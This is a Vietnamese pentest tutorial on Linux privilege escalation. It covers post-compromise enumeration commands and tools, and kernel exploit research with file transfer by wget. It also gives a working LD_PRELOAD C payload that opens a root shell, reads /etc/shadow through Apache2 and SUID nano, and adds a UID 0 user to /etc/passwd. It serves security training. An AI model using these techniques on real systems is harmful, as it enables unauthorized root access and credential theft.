###**What does "privilege escalation" mean?**

privilege escalation là việc leo quyền từ thấp lên cao. Nó có được là nhờ sự khai thác lỗ hổng, lỗi logic và cấu hình sai trên hệ điều hoặc app để có truy cập trái phép vào source bị cấm 

###**Hướng dẫn Thu thập Thông tin (Enumeration) sau khi Xâm nhập Hệ thống Linux**

Enumeration (Liệt kê/Thu thập thông tin) là bước đầu tiên bạn phải thực hiện ngay khi giành được quyền truy cập vào bất kỳ hệ thống nào. Dù bạn vào được hệ thống thông qua lỗ hổng nghiêm trọng với quyền root hay chỉ là một tài khoản đặc quyền thấp, việc hiểu rõ môi trường là cực kỳ quan trọng.

Khác với các máy CTF (Capture The Flag), các dự án Pentest thực tế không kết thúc khi bạn chiếm được một user. Enumeration trong giai đoạn hậu xâm nhập (post-compromise) cũng quan trọng y như giai đoạn trước đó.

1. Thông tin Hệ thống Cơ bản

hostname: Trả về tên máy chủ của mục tiêu. Đôi khi tên này tiết lộ vai trò của máy trong mạng doanh nghiệp (Ví dụ: SQL-PROD-01 cho thấy đây là máy chủ SQL chạy môi trường production).

uname -a: In ra thông tin hệ thống chi tiết về Kernel. Điều này cực kỳ hữu ích khi tìm kiếm các lỗ hổng Kernel tiềm năng để leo thang đặc quyền.

/proc/version: File này cung cấp thông tin về phiên bản Kernel và các dữ liệu bổ sung như trình biên dịch (ví dụ: GCC) có được cài đặt hay không.

/etc/issue: Chứa thông tin về hệ điều hành. Tuy nhiên, file này rất dễ bị quản trị viên thay đổi hoặc tùy chỉnh.

2. Quản lý Tiến trình và Môi trường

Lệnh ps (Process Status)Dùng để xem các tiến trình đang chạy.
- PID: ID duy nhất của tiến trình.
- TTY: Loại terminal người dùng đang sử dụng.
- Time: Thời gian CPU mà tiến trình đã sử dụng.
- CMD: Lệnh hoặc tệp thực thi đang chạy.
Các tham số hữu ích:
- ps -A: Xem tất cả các tiến trình đang chạy.
- ps axjf: Xem dưới dạng cây tiến trình (process tree).
- ps aux: Hiển thị tiến trình của tất cả người dùng (a), hiển thị người dùng thực thi (u) và các tiến trình không gắn với terminal (x).
Biến môi trường
- env: Hiển thị các biến môi trường. Biến PATH có thể chứa các trình biên dịch hoặc ngôn ngữ lập trình (như Python) có thể tận dụng để chạy mã độc hoặc leo thang đặc quyền.

3. Người dùng và Đặc quyền
- sudo -l: Liệt kê tất cả các lệnh mà người dùng hiện tại có thể chạy với quyền sudo. Đây là "mỏ vàng" để leo thang đặc quyền.
- ls -la: Luôn sử dụng tham số -la để liệt kê cả các file ẩn (bắt đầu bằng dấu chấm) và quyền hạn chi tiết. Đừng để lỡ các file như .secret.txt.
- id: Cung cấp cái nhìn tổng quan về cấp độ đặc quyền và tư cách thành viên nhóm của người dùng. Bạn cũng có thể kiểm tra cho người dùng khác: id [username].
- /etc/passwd: Đọc file này để khám phá danh sách người dùng trên hệ thống.Mẹo: Sử dụng grep "home" để lọc ra các người dùng thực tế vì họ thường có thư mục trong /home.
4. Lịch sử và Mạng lưới
- history: Xem các lệnh đã thực hiện trước đó. Đôi khi quản trị viên vô tình để lại mật khẩu hoặc thông tin nhạy cảm tại đây.
- ifconfig / ip addr: Kiểm tra các giao diện mạng. Nếu máy có nhiều card mạng (như eth0, tun0), nó có thể là điểm cầu nối (pivoting) để tấn công vào các mạng nội bộ khác.
- netstat: Kiểm tra các kết nối mạng hiện có:
  netstat -a: Hiển thị tất cả socket.
  netstat -at / netstat -au: Liệt kê các kết nối TCP hoặc UDP.
  netstat -l: Liệt kê các cổng đang ở chế độ "nghe" (listening).
  netstat -ano: Hiển thị tất cả socket, không phân giải tên và hiển thị bộ định thời.
5. Khai thác sức mạnh lệnh find
  Lệnh find là công cụ cực kỳ mạnh mẽ để tìm kiếm các vector leo thang đặc quyền.Mục đích tìm kiếmLệnh ví dụ
  Tìm file theo tên  find . -name flag1.txt
  Tìm thư mục  find / -type d -name config
  Tìm file có quyền 777  find / -type f -perm 0777
  Tìm file của user cụ thể  find /home -user frank
  Tìm file đã thay đổi gần đây  find / -mtime 10 (10 ngày qua)
  Tìm file theo dung lượng  find / -size +100M (Lớn hơn 100MB)
  Lưu ý quan trọng: Để tránh thông tin rác từ các lỗi "Permission Denied", hãy thêm 2>/dev/null vào cuối lệnh:find / -perm -u=s -type f 2>/dev/nullSUID Bit: Lệnh trên dùng để tìm các file có set SUID bit. Các file này sẽ chạy với đặc quyền của chủ sở hữu file (thường là root) thay vì người dùng đang thực thi nó, đây là một hướng leo thang đặc quyền rất phổ biến.

6. Các công cụ hỗ trợ khác

  Hãy dành thời gian làm quen với các công cụ xử lý văn bản như: grep, locate, cut, sort, và awk. Chúng sẽ giúp bạn lọc dữ liệu khổng lồ từ hệ thống thành những thông tin có giá trị.


**Các Công cụ Thu thập Thông tin Tự động**
Có rất nhiều công cụ có thể giúp ông tiết kiệm thời gian trong quá trình enumeration. Tuy nhiên, lưu ý quan trọng là: Chỉ nên dùng các công cụ này để tiết kiệm thời gian khi ông đã hiểu rõ bản chất, vì chúng vẫn có thể bỏ sót một số vector leo thang đặc quyền (privilege escalation) nhất định.

Dưới đây là danh sách các công cụ enumeration phổ biến trên Linux kèm theo link Github của chúng:

**Lưu ý về môi trường hệ thống**
Môi trường của máy mục tiêu sẽ quyết định ông có thể chạy được tool nào. Ví dụ: Ông không thể chạy một công cụ viết bằng Python nếu máy đó chưa cài Python. Đó là lý do tại sao ông nên làm quen với nhiều loại tool khác nhau thay vì chỉ trung thành với duy nhất một cái "tủ".

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS(opens in new tab)
- LinEnum: https://github.com/rebootuser/LinEnum(opens in new tab)(opens in new tab)
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester(opens in new tab)
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration(opens in new tab)
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

**Leo thang Đặc quyền (Privilege Escalation)**
Mục tiêu lý tưởng của việc leo thang đặc quyền là đạt được quyền root. Đôi khi điều này có thể thực hiện được chỉ bằng cách khai thác một lỗ hổng sẵn có, hoặc trong một số trường hợp, bằng cách truy cập vào một tài khoản người dùng khác có nhiều đặc quyền hơn, có nhiều thông tin hơn hoặc có quyền truy cập rộng hơn.

Trừ khi có một lỗ hổng duy nhất dẫn thẳng đến shell của root, quá trình leo thang đặc quyền thường sẽ dựa vào các lỗi cấu hình sai (misconfigurations) và phân quyền lỏng lẻo (lax permissions).

**Khai thác Kernel (Nhân hệ thống)**
Kernel trên các hệ thống Linux quản lý việc giao tiếp giữa các thành phần như bộ nhớ hệ thống và các ứng dụng. Vì chức năng quan trọng này đòi hỏi Kernel phải có các đặc quyền cụ thể; do đó, một cuộc khai thác thành công sẽ tiềm tàng khả năng dẫn thẳng đến quyền root.

Quy trình khai thác Kernel rất đơn giản:
1. Xác định phiên bản Kernel: Sử dụng lệnh uname -a hoặc cat /proc/version.

2. Tìm kiếm mã khai thác (exploit code): Tìm mã tương ứng với phiên bản Kernel của hệ thống mục tiêu.

3. Chạy mã khai thác: Thực thi để chiếm quyền.

**CẢNH BÁO QUAN TRỌNG**: Mặc dù trông có vẻ đơn giản, hãy nhớ rằng một cuộc khai thác Kernel thất bại có thể dẫn đến treo hệ thống (system crash). Hãy đảm bảo rằng kết quả rủi ro này là có thể chấp nhận được trong phạm vi dự án Pentest của ông trước khi thử khai thác Kernel. Trong các kỳ thi như OSCP hay môi trường thực tế, làm sập server là một lỗi cực nặng.

Nguồn nghiên cứu (Research sources)
Dựa trên những thông tin thu thập được, ông có thể sử dụng Google để tìm kiếm mã khai thác hiện có.

Các nguồn như CVE Details cực kỳ hữu ích.

Một lựa chọn khác là sử dụng các script như LES (Linux Exploit Suggester). Tuy nhiên, hãy nhớ rằng các công cụ này có thể tạo ra:

- False positives (Dương tính giả): Báo cáo một lỗ hổng Kernel thực tế không ảnh hưởng đến hệ thống mục tiêu.

- False negatives (Âm tính giả): Không báo cáo bất kỳ lỗ hổng nào mặc dù Kernel thực sự có lỗ hổng.

**Các Gợi ý và Lưu ý (Hints/Notes)**

Đừng quá cụ thể: Khi tìm kiếm exploit trên Google, Exploit-db hoặc searchsploit, đừng quá chi tiết về phiên bản Kernel (ví dụ: thay vì tìm đích danh 4.4.0-116-generic, hãy thử tìm Linux Kernel 4.4.0).

Hiểu mã nguồn TRƯỚC KHI chạy: Hãy chắc chắn ông hiểu cách mã khai thác hoạt động trước khi khởi chạy nó. Một số mã exploit có thể thay đổi hệ điều hành khiến chúng mất an toàn trong quá trình sử dụng tiếp theo hoặc tạo ra những thay đổi không thể đảo ngược, gây ra sự cố về sau.


Trong Lab/CTF: Chuyện này không quá quan trọng.

Trong Pentest thực tế: Đây là điều tuyệt đối cấm kỵ (No-nos).

Tương tác sau khi chạy: Một số exploit yêu cầu tương tác thêm sau khi chạy. Hãy đọc kỹ tất cả các bình luận (comments) và hướng dẫn đi kèm trong mã nguồn.

Chuyển file: Ông có thể chuyển mã khai thác từ máy của mình sang máy mục tiêu bằng cách sử dụng module SimpleHTTPServer của Python (trên máy công) và lệnh wget (trên máy mục tiêu).


**Leo thang Đặc quyền qua Lệnh Sudo**

Lệnh sudo, theo mặc định, cho phép ông chạy một chương trình với đặc quyền của người dùng root. Trong một số điều kiện, quản trị viên hệ thống có thể cần cấp cho người dùng bình thường một chút linh hoạt về đặc quyền.

Ví dụ: Một chuyên viên phân tích SOC cấp thấp (junior) có thể cần sử dụng Nmap thường xuyên nhưng không được phép có toàn quyền truy cập root. Trong tình huống này, quản trị viên có thể cho phép người dùng này chỉ chạy Nmap với quyền root, trong khi vẫn giữ mức đặc quyền bình thường cho các hoạt động khác trên hệ thống.

Bất kỳ người dùng nào cũng có thể kiểm tra tình trạng quyền root hiện tại của mình bằng lệnh:
sudo -l

Nguồn tài nguyên vàng: GTFOBins là một trang web cực kỳ giá trị cung cấp thông tin về cách tận dụng bất kỳ chương trình nào mà ông có quyền sudo để leo thang đặc quyền.

1. Tận dụng các chức năng của ứng dụng (Leverage application functions)
Một số ứng dụng sẽ không có lỗ hổng (exploit) đã biết trong bối cảnh này. Một ứng dụng điển hình mà ông có thể thấy là máy chủ Apache2.

Trong trường hợp này, chúng ta có thể sử dụng một "mẹo" (hack) để rò rỉ thông tin bằng cách tận dụng một chức năng của ứng dụng. Apache2 có một tùy chọn hỗ trợ tải các tệp cấu hình thay thế (-f: specify an alternate ServerConfigFile).

Cách thực hiện:
Việc tải tệp /etc/shadow (nơi lưu trữ mật khẩu đã hash của hệ thống) bằng tùy chọn này sẽ dẫn đến một thông báo lỗi. Điều thú vị là thông báo lỗi này thường bao gồm luôn dòng đầu tiên của tệp /etc/shadow, từ đó giúp ông "đọc lén" được dữ liệu nhạy cảm.

2. Tận dụng LD_PRELOAD
Trên một số hệ thống, ông có thể thấy tùy chọn môi trường LD_PRELOAD khi gõ sudo -l.

LD_PRELOAD là một chức năng cho phép bất kỳ chương trình nào sử dụng các thư viện dùng chung (shared libraries). Nếu tùy chọn env_keep được bật cho LD_PRELOAD, chúng ta có thể tạo ra một thư viện dùng chung, thư viện này sẽ được tải và thực thi trước khi chương trình chính chạy.

Lưu ý: LD_PRELOAD sẽ bị bỏ qua nếu ID người dùng thực sự khác với ID người dùng hiệu dụng (effective user ID).

Các bước thực hiện:

Kiểm tra LD_PRELOAD: Xem nó có xuất hiện trong phần env_keep khi chạy sudo -l không.

Viết code C: Tạo một đoạn code đơn giản và biên dịch thành tệp đối tượng chia sẻ (.so).

Chạy chương trình: Chạy bất kỳ lệnh nào ông có quyền sudo kèm theo tùy chọn LD_PRELOAD trỏ đến tệp .so của ông.

Đoạn code C (shell.c):
Đoạn code này đơn giản là sẽ mở ra một shell của root:

C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
Biên dịch:
Sử dụng gcc để biến file .c thành file thư viện .so:

Bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
Thực thi:
Bây giờ, hãy dùng file .so này khi khởi chạy bất kỳ chương trình nào mà ông có quyền sudo (ví dụ: find, apache2, hay bất cứ thứ gì):

Bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
Kết quả: Một shell với quyền root sẽ được mở ra ngay lập tức!

**Leo thang Đặc quyền qua SUID và SGID**
Phần lớn việc kiểm soát đặc quyền trên Linux dựa vào việc quản lý tương tác giữa người dùng và tệp tin thông qua permissions (quyền hạn). Như ông đã biết, tệp tin có các quyền: đọc (read), ghi (write) và thực thi (execute). Thông thường, các quyền này được cấp dựa trên cấp độ đặc quyền của người dùng.

Tuy nhiên, mọi thứ sẽ thay đổi với SUID (Set-user Identification) và SGID (Set-group Identification).

SUID: Cho phép tệp được thực thi với cấp độ quyền hạn của chủ sở hữu tệp (thường là root).

SGID: Cho phép tệp được thực thi với quyền của nhóm sở hữu tệp.

Ông sẽ nhận biết các tệp này qua chữ "s" xuất hiện trong phần liệt kê quyền hạn thay vì chữ "x".

1. Cách tìm các tệp SUID/SGID
Sử dụng lệnh sau để liệt kê tất cả các tệp có bit SUID hoặc SGID được thiết lập:
find / -type f -perm -04000 -ls 2>/dev/null

2. Sử dụng GTFOBins
Một thói quen tốt là so sánh danh sách các file tìm được với GTFOBins (https://gtfobins.github.io).

Khi vào trang web, hãy nhấn vào nút SUID để lọc ra những tệp tin nhị phân (binaries) được biết là có thể khai thác được khi có bit SUID.

Nghiên cứu trường hợp: Trình soạn thảo nano
Giả sử trong danh sách tìm được, ông thấy nano có bit SUID. Thông thường, nano không cho ông quyền root ngay lập tức (không có "easy win"), nhưng nó cho phép ông đọc và chỉnh sửa bất kỳ tệp nào với quyền của chủ sở hữu (root).

Từ đây, chúng ta có 2 hướng để leo thang đặc quyền:

Hướng 1: Đọc tệp /etc/shadow và bẻ khóa mật khẩu
Chạy lệnh: nano /etc/shadow. Lúc này ông sẽ thấy toàn bộ nội dung tệp chứa mã băm (hash) mật khẩu của hệ thống.

Sử dụng công cụ unshadow để kết hợp /etc/shadow và /etc/passwd thành một tệp mà công cụ John the Ripper có thể hiểu được:
unshadow passwd.txt shadow.txt > passwords.txt

Dùng John the Ripper để bẻ khóa (nếu may mắn và wordlist đủ tốt, ông sẽ có mật khẩu cleartext).

Hướng 2: Thêm người dùng mới vào /etc/passwd (Nhanh hơn)
Cách này giúp ông tránh việc phải ngồi chờ bẻ khóa mật khẩu mệt mỏi. Ông sẽ tự tạo một người dùng có quyền root.

Bước 1: Tạo mã băm mật khẩu trên máy tấn công (Kali Linux)
Sử dụng công cụ openssl để tạo hash cho mật khẩu ông muốn (ví dụ mật khẩu là password123):
openssl passwd -1 -salt [tên_muối] password123

Bước 2: Thêm dòng mới vào /etc/passwd
Dùng nano (đang có quyền SUID root) mở tệp /etc/passwd và thêm một dòng ở cuối theo định dạng:
newroot:$1$salt$hash...:0:0:root:/root:/bin/bash
(Lưu ý: Số 0:0 chính là UID và GID của root, biến người dùng này thành "trùm")

Bước 3: Đăng nhập và chiếm quyền
Sau khi lưu tệp, chỉ cần chuyển sang người dùng vừa tạo:
su newroot
Gõ mật khẩu ông đã thiết lập, và bùm... ông đã là root.
